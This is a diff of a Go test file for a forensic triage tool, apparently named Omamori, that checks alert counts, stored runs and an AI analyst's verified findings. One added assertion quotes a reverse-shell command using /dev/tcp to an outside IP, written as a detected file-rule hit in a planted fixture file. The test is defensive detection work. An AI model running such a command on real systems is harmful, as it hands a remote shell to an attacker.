@@ -12,6 +12,7 @@ import (
 
 	"github.com/kenzietann/omamori/internal/analysisrun"
 	"github.com/kenzietann/omamori/internal/analyst"
+	"github.com/kenzietann/omamori/internal/filerules"
 	"github.com/kenzietann/omamori/internal/forensics"
 	"github.com/kenzietann/omamori/internal/outbound"
 	"github.com/kenzietann/omamori/internal/rules"
@@ -48,7 +49,7 @@ func TestForensicsThroughTheCommandLine(t *testing.T) {
 	if got.code != exitOK {
 		t.Fatalf("forensics: %d %s", got.code, got.stderr)
 	}
-	if !strings.Contains(got.stdout, "Read and hashed 22 files: 1254 log events and 77 artifacts. 45 rules. 28 alerts, 3 critical, 16 high, 9 medium.") ||
+	if !strings.Contains(got.stdout, "Read and hashed 31 files: 1254 log events and 83 artifacts. 53 rules. 34 alerts, 3 critical, 20 high, 11 medium.") ||
 		!strings.Contains(got.stdout, "Stored run:") {
 		t.Errorf("the summary is %q", got.stdout)
 	}
@@ -74,7 +75,7 @@ func TestForensicsThroughTheCommandLine(t *testing.T) {
 	var expected struct {
 		Alerts []struct{ Rule string } `json:"expected_alerts"`
 	}
-	if err := json.Unmarshal([]byte(before[filepath.Join(host, "expected.json")]), &expected); err != nil || len(expected.Alerts) != 24 {
+	if err := json.Unmarshal([]byte(before[filepath.Join(host, "expected.json")]), &expected); err != nil || len(expected.Alerts) != 30 {
 		t.Fatalf("expected.json: %v, %d alerts", err, len(expected.Alerts))
 	}
 	for _, wanted := range expected.Alerts {
@@ -94,7 +95,7 @@ func TestForensicsThroughTheCommandLine(t *testing.T) {
 	}
 
 	runs := decodeStored[[]store.Run](t, storedCommand(t, database, "runs"))
-	if len(runs) != 1 || runs[0].EventCount != 1331 || runs[0].AlertCount != 28 {
+	if len(runs) != 1 || runs[0].EventCount != 1337 || runs[0].AlertCount != 34 {
 		t.Fatalf("stored run: %#v", runs)
 	}
 	keys := decodeStored[[]store.Event](t, storedCommand(t, database, "search", "--run", runs[0].ID, "--field", "service", "--value", "authorized_keys"))
@@ -107,7 +108,7 @@ func TestForensicsThroughTheCommandLine(t *testing.T) {
 	}
 
 	verified := runAt(t, detectNow, "forensics", "verify", filepath.Join(folder, "manifest.json"), filepath.Join(host, "root"))
-	if verified.code != exitOK || !strings.Contains(verified.stdout, "Checked 20 files. 0 are not as the manifest says.") {
+	if verified.code != exitOK || !strings.Contains(verified.stdout, "Checked 29 files. 0 are not as the manifest says.") {
 		t.Fatalf("verify: %d %q %q", verified.code, verified.stdout, verified.stderr)
 	}
 	passwd := filepath.Join(host, "root", "etc", "passwd")
@@ -124,7 +125,7 @@ func TestForensicsThroughTheCommandLine(t *testing.T) {
 func TestForensicsOnTheSystemWithoutAnAttack(t *testing.T) {
 	host := hostFixture(t, true)
 	got := runAt(t, detectNow, forensicsArgs(host, filepath.Join(t.TempDir(), "out"))...)
-	if got.code != exitOK || !strings.Contains(got.stdout, "45 rules. 0 alerts.") {
+	if got.code != exitOK || !strings.Contains(got.stdout, "53 rules. 0 alerts.") {
 		t.Fatalf("code %d, stdout %q, stderr %q", got.code, got.stdout, got.stderr)
 	}
 }
@@ -201,8 +202,12 @@ func forensicSnapshot(t *testing.T, host string) analyst.Snapshot {
 	if err != nil {
 		t.Fatal(err)
 	}
+	fileRules, err := filerules.Builtin()
+	if err != nil {
+		t.Fatal(err)
+	}
 	result, err := forensics.Run(filepath.Join(host, "root"), set, "built-in", forensics.Options{
-		Year: 2026, Location: time.FixedZone("JST", 9*3600), Processes: filepath.Join(host, "snapshots", "ps.txt"), Sockets: filepath.Join(host, "snapshots", "ss.txt"),
+		FileRules: &fileRules, Year: 2026, Location: time.FixedZone("JST", 9*3600), Processes: filepath.Join(host, "snapshots", "ps.txt"), Sockets: filepath.Join(host, "snapshots", "ss.txt"),
 	}, detectNow)
 	if err != nil {
 		t.Fatal(err)
@@ -252,7 +257,7 @@ func TestForensicsWithTheAnalystThroughTheCommandLine(t *testing.T) {
 	if live.code != exitOK || len(provider.sent) != 1 {
 		t.Fatalf("live: %d %s %s, calls %d", live.code, live.stdout, live.stderr, len(provider.sent))
 	}
-	if !strings.Contains(live.stdout, "28 verified findings, 0 rejected claims, 0 unreviewed alerts") || !strings.Contains(live.stdout, "Stored run:") {
+	if !strings.Contains(live.stdout, "34 verified findings, 0 rejected claims, 0 unreviewed alerts") || !strings.Contains(live.stdout, "Stored run:") {
 		t.Errorf("the summary is %q", live.stdout)
 	}
 	// What left the machine: the bounded snapshot with placeholders. Not the secret, not a private file, no tools.
@@ -267,6 +272,12 @@ func TestForensicsWithTheAnalystThroughTheCommandLine(t *testing.T) {
 	if strings.Contains(body, host) {
 		t.Fatal("the request holds the path of the evidence folder")
 	}
+	// A hit of a file rule reaches the AI with what it found, so that the review has something to read.
+	for _, want := range []string{`"file_rule":"file_reverse_shell"`, `"file":"/var/tmp/.dbus/helper"`, `"matched":"dev_tcp"`, `"excerpt":"bash -i \u003e\u0026 /dev/tcp/203.0.113.80/4444"`} {
+		if !strings.Contains(strings.ReplaceAll(body, `\"`, `"`), want) {
+			t.Errorf("the request does not have %s", want)
+		}
+	}
 
 	folder := filepath.Join(output, "forensics-20261111-030405")
 	read := func(name string) string {
@@ -279,7 +290,7 @@ func TestForensicsWithTheAnalystThroughTheCommandLine(t *testing.T) {
 		return string(data)
 	}
 	report, manifest := read("report.md"), read("manifest.json")
-	for _, want := range []string{"# Omamori forensic triage report", "## Attack timeline", "## Evidence manifest", "## AI analyst", "- Verified claims: 28",
+	for _, want := range []string{"# Omamori forensic triage report", "## Attack timeline", "## Evidence manifest", "## AI analyst", "- Verified claims: 34",
 		"The checked AI review is shown separately below.", "do not say when or in which order things happened"} {
 		if !strings.Contains(report, want) {
 			t.Errorf("the report does not have %q", want)
@@ -299,7 +310,7 @@ func TestForensicsWithTheAnalystThroughTheCommandLine(t *testing.T) {
 	}
 
 	var result analysisrun.Result
-	if err := json.Unmarshal([]byte(read("analysis.json")), &result); err != nil || !result.Complete || len(result.Analysis.Verified) != 28 {
+	if err := json.Unmarshal([]byte(read("analysis.json")), &result); err != nil || !result.Complete || len(result.Analysis.Verified) != 34 {
 		t.Fatalf("analysis.json: %v", err)
 	}
 	weak := 0
@@ -308,12 +319,12 @@ func TestForensicsWithTheAnalystThroughTheCommandLine(t *testing.T) {
 			weak++
 		}
 	}
-	if weak != 8 {
-		t.Errorf("%d findings are marked as having weak times, want 8", weak)
+	if weak != 14 {
+		t.Errorf("%d findings are marked as having weak times, want 14", weak)
 	}
 
 	runs := decodeStored[[]store.Run](t, storedCommand(t, database, "runs"))
-	if len(runs) != 1 || runs[0].AlertCount != 28 || runs[0].EventCount != 1331 {
+	if len(runs) != 1 || runs[0].AlertCount != 34 || runs[0].EventCount != 1337 {
 		t.Fatalf("stored runs: %#v", runs)
 	}
 	shown := storedCommand(t, database, "run", runs[0].ID)
@@ -327,7 +338,7 @@ func TestForensicsWithTheAnalystThroughTheCommandLine(t *testing.T) {
 	}
 	replayOutput := filepath.Join(t.TempDir(), "replay")
 	replayed := analyzeCommand(t, noProvider, forensicsArgs(host, replayOutput, "--analyze", "--replay", filepath.Join(folder, "recording.json"))...)
-	if replayed.code != exitOK || !strings.Contains(replayed.stdout, "REPLAY") || !strings.Contains(replayed.stdout, "28 verified findings") {
+	if replayed.code != exitOK || !strings.Contains(replayed.stdout, "REPLAY") || !strings.Contains(replayed.stdout, "34 verified findings") {
 		t.Fatalf("replay: %d %s %s", replayed.code, replayed.stdout, replayed.stderr)
 	}
 	passwd := filepath.Join(host, "root", "etc", "passwd")
